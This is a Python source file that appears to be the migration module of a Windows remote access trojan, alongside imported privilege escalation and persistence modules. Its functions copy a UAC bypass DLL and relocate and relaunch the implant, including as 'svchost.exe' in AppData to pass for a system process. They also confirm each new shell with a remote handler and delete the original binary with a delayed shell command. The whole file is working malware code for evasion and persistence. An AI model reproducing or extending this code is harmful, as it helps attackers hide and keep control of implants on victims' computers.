from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex, mutex
# Functions related to migrating the executable.

def copy_DLL(path): # Copy UAC bypass DLL to another location.
	origpath = os.path.join(os.path.dirname(EXECUTABLE_PATH), UAC_DLL)
	path = os.path.join(path, UAC_DLL)
	shutil.copyfile(origpath, path)
	
def handler_confirmation(): # Get confirmation from handler that the new shell started successfully.
	for mutex in mutexes:
		print "Releasing "+repr(mutex)
		if mutex is not None: mutex.release()
	communication.status("NEWCONN")
	success = sock.recv(2048)
	if success == chr(1):
		return True
	for mutex in mutexes:
		print "Acquiring "+repr(mutex)
		if mutex is not None: mutex.acquire(10)
	return False
	
def migrate():
	if not handler_confirmation():
		return False	
	sock.close()
	os._exit(0)
		
def migrate_ex(data): # Move executable to a different location.
	try:
		
		try: dest = os.path.join(data.split()[1], EXECUTABLE_PATH)
		except IndexError: dest = os.getcwd()+"\\"+sys.executable.split("\\")[-1]
		
		print os.getcwd()
		print "source: "+EXECUTABLE_PATH
		print "destination: "+dest
		shutil.copyfile(EXECUTABLE_PATH, dest)
		os.startfile(dest)
		
		if not handler_confirmation():
			return "[-]Failed to migrate to "+dest
			
		copy_DLL(os.path.dirname(dest))

		subprocess.Popen("ping 127.0.0.1 -n 6 > nul & del "+EXECUTABLE_PATH,shell=True,stdin=None,stdout=None,stderr=None)
		
		sock.close()
		os._exit(0)
	except Exception as e:
		return "Migration failed: "+str(e)
		
def move_to_appdata(): # Migrate to %AppData%.
	appPath = os.path.join(os.environ['APPDATA'], "svchost.exe")
	shutil.copyfile(EXECUTABLE_PATH, appPath)
	os.startfile(appPath)
	
	if not handler_confirmation():
		return "[-]Failed to move to AppData."

	sock.close()
	os._exit(0)
	
def rename_self(sock, data): # Rename executable.
	try: newname = data.split()[1]
	except: return "[-]Supply a new name."
	
	if not newname.endswith(".exe"):
		return "[-]New name does not end with '.exe'."
	
	os.rename(EXECUTABLE_PATH, newname)
	os.startfile(os.path.join(os.path.abspath(os.path.dirname(EXECUTABLE_PATH)), newname))
	
	if not handler_confirmation():
		return "[-]Failed to change name."
		
	sock.close()
	os._exit(0)